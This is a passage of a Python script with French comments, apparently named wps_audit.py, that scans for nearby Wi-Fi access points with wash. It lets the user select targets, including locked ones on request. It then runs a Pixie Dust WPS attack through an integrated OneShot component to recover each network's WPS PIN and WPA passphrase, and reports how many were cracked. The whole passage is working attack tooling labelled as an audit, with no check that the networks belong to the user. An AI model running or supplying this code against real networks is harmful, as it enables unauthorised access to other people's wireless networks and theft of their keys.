    r"([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}"
    r":[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2})"
)
_SKIP_RE   = re.compile(r"^\s*(BSSID|---|-{3,}|\[|Wash|Scanning|Found|$)", re.I)
_VENDOR_RE = re.compile(
    r"^(Unknown|AtherosC|RalinkTe|Broadcom|IntelCor|"
    r"Qualcomm|MediaTek|Realtek|CiscoSys|HuaweiTe|"
    r"[A-Z][a-zA-Z0-9]{2,9})$"
)


def _parse_wash(line: str) -> Optional[WPSTarget]:
    if _SKIP_RE.match(line): return None
    bm = _BSSID_RE.search(line)
    if not bm: return None
    bssid  = bm.group(1)
    rest   = line[bm.end():].split()
    if len(rest) < 4: return None
    ch = rest[0]; rssi = rest[1]; wpsv = rest[2]
    locked = rest[3].lower() in ("yes", "1", "true")
    rem = rest[4:]
    vendor = ""; essid = ""
    if not rem: essid = "(inconnu)"
    elif len(rem) == 1:
        if _VENDOR_RE.match(rem[0]): vendor, essid = rem[0], "(inconnu)"
        else: essid = rem[0]
    else:
        if _VENDOR_RE.match(rem[0]): vendor = rem[0]; essid = " ".join(rem[1:])
        else: essid = " ".join(rem)
    return WPSTarget(bssid, ch, rssi, wpsv, locked, vendor, essid or "(inconnu)")


def wash_scan(iface_mon: str, duration: int) -> List[WPSTarget]:
    log_step(f"Scan WPS passif — {duration}s sur {iface_mon}")
    stdout_l: List[str] = []; stderr_l: List[str] = []

    try:
        proc = subprocess.Popen(
            ["wash", "-i", iface_mon],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True, bufsize=1, preexec_fn=os.setsid,
        )
    except FileNotFoundError:
        log_error("wash introuvable"); return []

    _reg(proc)
    time.sleep(1)
    if proc.poll() is not None:
        log_error("wash planté"); _unreg(proc); return []

    def _rd(s, st):
        try:
            for line in s: st.append(line.rstrip())
        except Exception: pass

    t1 = threading.Thread(target=_rd, args=(proc.stdout, stdout_l), daemon=True)
    t2 = threading.Thread(target=_rd, args=(proc.stderr, stderr_l), daemon=True)
    t1.start(); t2.start()

    for e in range(duration):
        if proc.poll() is not None: print(file=sys.stderr); break
        found = sum(1 for l in stdout_l + stderr_l if _BSSID_RE.search(l))
        pct   = int(e * 100 / duration)
        bar   = "█" * (pct // 5) + "░" * (20 - pct // 5)
        print(f"\r  [{bar}] {pct:3d}% ({e:2d}s/{duration}s) — {found} AP",
              end="", file=sys.stderr, flush=True)
        time.sleep(1)

    found = sum(1 for l in stdout_l + stderr_l if _BSSID_RE.search(l))
    print(f"\r  [{'█'*20}] 100% ({duration}s/{duration}s) — {found} AP",
          file=sys.stderr)

    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        proc.wait(timeout=3)
    except Exception: pass
    _unreg(proc)
    t1.join(timeout=2); t2.join(timeout=2)

    src = stdout_l if any(_BSSID_RE.search(l) for l in stdout_l) else stderr_l
    targets = []
    for line in src:
        t = _parse_wash(line)
        if t: targets.append(t)

    targets.sort(key=lambda t: t.rssi_int, reverse=True)
    log_info(
        f"Résultat : {len(targets)} cibles"
        f" ({sum(1 for t in targets if not t.locked)} ouvertes,"
        f" {sum(1 for t in targets if t.locked)} verrouillées)"
    )
    return targets


# ─────────────────────────────────────────────────────────────────────────────
#  SÉLECTION INTERACTIVE
# ─────────────────────────────────────────────────────────────────────────────

def select_targets(all_targets: List[WPSTarget]) -> List[WPSTarget]:
    print(file=sys.stderr)
    log_step("Sélection des cibles à auditer")
    print(file=sys.stderr)

    print(
        f"  {C.BOLD}{'#':<4} {'BSSID':<19} {'CH':<4} "
        f"{'dBm':<6} {'SIG':<6} {'WPS':<5} {'LCK':<5} ESSID{C.RESET}",
        file=sys.stderr,
    )
    print(f"  {'─'*75}", file=sys.stderr)

    for i, t in enumerate(all_targets, 1):
        lck = f"{C.RED}OUI{C.RESET}" if t.locked else f"{C.GREEN}NON{C.RESET}"
        dim = C.DIM if t.locked else ""
        rst = C.RESET if t.locked else ""
        print(
            f"  {C.BOLD}{i:<4}{C.RESET}"
            f"{dim}{t.bssid:<19} {t.channel:<4} "
            f"{t.rssi:<6}{rst} {t.signal_bar} "
            f"{dim}{t.wps_ver:<5}{rst} {lck:<5} {dim}{t.essid}{rst}",
            file=sys.stderr,
        )

    print(f"  {'─'*75}", file=sys.stderr)
    unlocked = [t for t in all_targets if not t.locked]
    print(f"""
  Signal : {C.GREEN}████{C.RESET}≥-60  {C.GREEN}███{C.RESET}≥-70  {C.YELLOW}██{C.RESET}≥-80  {C.RED}█{C.RESET}<-80
  Trié par signal (meilleur en premier)

  {C.CYAN}1{C.RESET} | {C.CYAN}1,3{C.RESET} | {C.CYAN}1-4{C.RESET} | {C.CYAN}all{C.RESET} ({len(unlocked)} ouvertes) | {C.CYAN}q{C.RESET}
""", file=sys.stderr)

    while True:
        try: raw = input(f"  {C.BOLD}Choix > {C.RESET}").strip()
        except (EOFError, KeyboardInterrupt): return []

        if not raw: continue
        if raw.lower() == "q": return []
        if raw.lower() == "all":
            if not unlocked: log_warn("Aucune cible ouverte"); continue
            return unlocked

        selected: List[WPSTarget] = []
        err = False

        for part in raw.replace(" ", "").split(","):
            rm = re.match(r"^(\d+)-(\d+)$", part)
            if rm:
                for n in range(int(rm.group(1)), int(rm.group(2)) + 1):
                    if 1 <= n <= len(all_targets):
                        t = all_targets[n - 1]
                        if not t.locked and t not in selected: selected.append(t)
                        elif t.locked: log_warn(f"#{n} verrouillé — ignoré")
                    else:
                        log_error(f"#{n} hors limites"); err = True
            elif part.isdigit():
                n = int(part)
                if 1 <= n <= len(all_targets):
                    t = all_targets[n - 1]
                    if t.locked:
                        log_warn(f"#{n} verrouillé. Forcer ? [o/N]")
                        try: ans = input("  > ").strip().lower()
                        except: ans = "n"
                        if ans in ("o", "y") and t not in selected:
                            selected.append(t)
                    elif t not in selected: selected.append(t)
                else:
                    log_error(f"#{n} invalide"); err = True
            else:
                log_error(f"'{part}' invalide"); err = True

        if err: log_warn("Corriger la saisie"); continue
        if not selected: log_warn("Aucune cible valide"); continue

        print(file=sys.stderr)
        log_info("Cibles sélectionnées :")
        for t in selected:
            tag = f" {C.YELLOW}[verrouillé]{C.RESET}" if t.locked else ""
            print(
                f"    {C.CYAN}→{C.RESET} CH{t.channel:>2}  "
                f"{t.bssid}  {t.rssi} dBm  {t.essid}{tag}",
                file=sys.stderr,
            )
        print(file=sys.stderr)

        try: conf = input(f"  {C.BOLD}Confirmer ? [O/n] > {C.RESET}").strip().lower()
        except: return []

        if conf in ("", "o", "y", "oui", "yes"): return selected
        log_info("Annulé")


# ─────────────────────────────────────────────────────────────────────────────
#  AUDIT WPS
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class WPSResult:
    bssid:   str = ""
    essid:   str = ""
    wps_pin: str = ""
    wpa_psk: str = ""

    def summary(self) -> str:
        def _v(v, label):
            if v: return f"{C.GREEN}{v}{C.RESET}"
            return f"{C.YELLOW}(non trouvé){C.RESET}"
        rows = [
            ("BSSID",  self.bssid),
            ("ESSID",  self.essid),
            ("PIN ✓" if self.wps_pin else "PIN", self.wps_pin or ""),
            ("PSK ✓" if self.wpa_psk else "PSK", self.wpa_psk or ""),
        ]
        return "\n".join(
            f"  {k:<8}: {_v(v, k)}" for k, v in rows
        )


def run_wps_audit(
    target:     WPSTarget,
    pixieforce: bool = False,
    verbose:    bool = False,
) -> WPSResult:
    """
    Lance l'audit WPS via Companion (OneShot intégré).
    Le restart de wpa_supplicant entre les deux phases est géré
    directement dans Companion._restart_wpa_supplicant().
    """
    result = WPSResult(bssid=target.bssid, essid=target.essid)

    log_step(
        f"Audit WPS : {target.essid}"
        f" ({target.bssid}) CH{target.channel}"
    )

    sig_v = target.rssi_int
    sig_l = (f"{C.GREEN}excellent{C.RESET}" if sig_v >= -60 else
             f"{C.GREEN}bon{C.RESET}"       if sig_v >= -70 else
             f"{C.YELLOW}moyen{C.RESET}"    if sig_v >= -80 else
             f"{C.RED}faible{C.RESET}")
    log_info(f"Signal : {target.rssi} dBm ({sig_l})")

    # s'assurer que wlan0 est UP
    subprocess.run(f"ip link set {IFACE} up", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)

    print(f"\n{C.CYAN}{'─'*60}\n  Pixie Dust Attack\n{'─'*60}{C.RESET}\n",
          file=sys.stderr)

    companion: Optional[Companion] = None
    try:
        companion = Companion(
            interface=IFACE,
            print_debug=verbose,
            save_result=False,
        )

        success = companion.single_connection(
            bssid=target.bssid,
            pixiemode=True,
            pixieforce=pixieforce,
        )

        # récupérer les résultats
        if companion.connection_status.wpa_psk:
            result.wpa_psk = companion.connection_status.wpa_psk
            if companion.connection_status.essid:
                result.essid = companion.connection_status.essid

        # chercher le PIN dans le fichier pixiewps
        pin_file = (pathlib.Path.home() / '.OneShot' / 'pixiewps'
                    / f"{target.bssid.replace(':', '').upper()}.run")
        if pin_file.is_file():
            result.wps_pin = pin_file.read_text().strip()

        if success:
            log_ok(f"Succès ! PIN={result.wps_pin} PSK={result.wpa_psk}")

    except KeyboardInterrupt:
        log_warn("Interruption utilisateur")
    except Exception as e:
        log_error(f"Erreur audit : {e}")
        if os.environ.get("DEBUG") == "1":
            import traceback; traceback.print_exc()
    finally:
        if companion:
            companion.cleanup()

    print(f"\n{C.CYAN}{'─'*60}{C.RESET}\n", file=sys.stderr)
    return result


# ─────────────────────────────────────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────────────────────────────────────

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("--iface", "-i",   default=IFACE)
    p.add_argument("--pins",  "-w",   default=str(SCRIPT_DIR / "wps_pins.txt"))
    p.add_argument("--scan-duration", type=int, default=WASH_DURATION)
    p.add_argument("--force", "-F",   action="store_true")
    p.add_argument("--verbose", "-v", action="store_true")
    p.add_argument("--bssid",         default=None)
    p.add_argument("--channel",       default=None)
    p.add_argument("--essid",         default="target")
    return p.parse_args()


# ─────────────────────────────────────────────────────────────────────────────
#  NETTOYAGE
# ─────────────────────────────────────────────────────────────────────────────

_cleanup_done: bool = False


def _cleanup(signum=None, frame=None):
    global _cleanup_done
    if _cleanup_done: return
    _cleanup_done = True
    print(file=sys.stderr)
    log_step("Nettoyage et restauration réseau...")
    _kill_all()
    mon = get_monitor_interface()
    if mon: disable_monitor_mode(mon)
    else:   restore_network()
    log_ok("Nettoyage terminé")
    sys.exit(130 if signum == signal.SIGINT else 0)


# ─────────────────────────────────────────────────────────────────────────────
#  RÉSUMÉ FINAL
# ─────────────────────────────────────────────────────────────────────────────

def print_summary(results: Dict[str, dict]):
    cracked = sum(1 for r in results.values() if r.get("pin") or r.get("psk"))
    print(file=sys.stderr)
    print(f"\n{C.BOLD}{'━'*55}\n  RÉSUMÉ FINAL\n{'━'*55}{C.RESET}",
          file=sys.stderr)
    for bssid, r in results.items():
        if r.get("pin") or r.get("psk"):
            pin_s = f"PIN:{C.GREEN}{r.get('pin','?')}{C.RESET} " if r.get("pin") else ""
            psk_s = f"PSK:{C.GREEN}{r.get('psk','?')}{C.RESET}"  if r.get("psk") else ""
            print(
                f"  {C.GREEN}✓{C.RESET} {r['essid']:<28} {bssid}\n"
                f"    {C.BOLD}{pin_s}{psk_s}{C.RESET}",
                file=sys.stderr,
            )
        else:
            print(f"  {C.RED}✗{C.RESET} {r['essid']:<28} {bssid}"
                  f"  — non vulnérable", file=sys.stderr)
    print(f"\n  Score : {C.GREEN}{cracked}{C.RESET}/{len(results)}\n"
          f"{C.BOLD}{'━'*55}{C.RESET}\n", file=sys.stderr)


# ─────────────────────────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────────────────────────

def main() -> int:
    args = parse_args()

    if os.geteuid() != 0:
        log_error("Root requis : sudo python3 wps_audit.py")
        return 1

    signal.signal(signal.SIGINT,  _cleanup)
    signal.signal(signal.SIGTERM, _cleanup)

    for tool in ["wash", "airmon-ng", "ip", "iw", "systemctl", "pixiewps"]:
        if not shutil.which(tool):
            log_error(f"Manquant : {tool}")
            if tool == "pixiewps": log_info("sudo apt install pixiewps")
            else: log_info("sudo apt install aircrack-ng")
            return 2

    try:
        if args.bssid:
            if not args.channel:
                log_error("--bssid requiert --channel"); return 2
            selected = [WPSTarget(
                bssid=args.bssid, channel=args.channel,
                rssi="?", wps_ver="?", locked=False,
                vendor="", essid=args.essid,
            )]
        else:
            mon_iface = enable_monitor_mode(IFACE)
            all_t = wash_scan(mon_iface, args.scan_duration)
            if not all_t:
                log_error("Aucune cible WPS")
                disable_monitor_mode(mon_iface); return 4

            selected = select_targets(all_t)
            if not selected:
                log_info("Aucune cible sélectionnée")
                disable_monitor_mode(mon_iface); return 0

            log_step("Désactivation monitor → wlan0 pour OneShot")
            disable_monitor_mode(mon_iface)

        # tuer NM et wpa_supplicant AVANT OneShot
        kill_interfering_processes()

        results: Dict[str, dict] = {}

        for idx, target in enumerate(selected, 1):
            print(file=sys.stderr)
            print(
                f"\n{C.BOLD}{C.MAGENTA}{'━'*55}\n"
                f"  Cible {idx}/{len(selected)} : {target.essid}\n"
                f"  {target.bssid} | CH{target.channel} | {target.rssi} dBm\n"
                f"{'━'*55}{C.RESET}",
                file=sys.stderr,
            )

            # Pixie Dust (force=False d'abord)
            wps = run_wps_audit(
                target, pixieforce=args.force, verbose=args.verbose
            )

            print(file=sys.stderr)
            log_info("═══ Résultat WPS ═══")
            print(wps.summary(), file=sys.stderr)
            print(file=sys.stderr)

            if wps.wps_pin:
                log_ok(f"PIN : {C.GREEN}{C.BOLD}{wps.wps_pin}{C.RESET}")
            if wps.wpa_psk:
                log_ok(f"PSK : {C.GREEN}{C.BOLD}{wps.wpa_psk}{C.RESET}")

            results[target.bssid] = {
                "essid": target.essid, "channel": target.channel,
                "pin": wps.wps_pin, "psk": wps.wpa_psk,
            }

            if idx < len(selected):
                log_info("Pause 10s avant la cible suivante...")
                # recréer les conditions pour la cible suivante
                kill_interfering_processes()
                time.sleep(10)

        print_summary(results)
        restore_network()
        return 0

    finally:
        _cleanup()


if __name__ == "__main__":
    sys.exit(main())
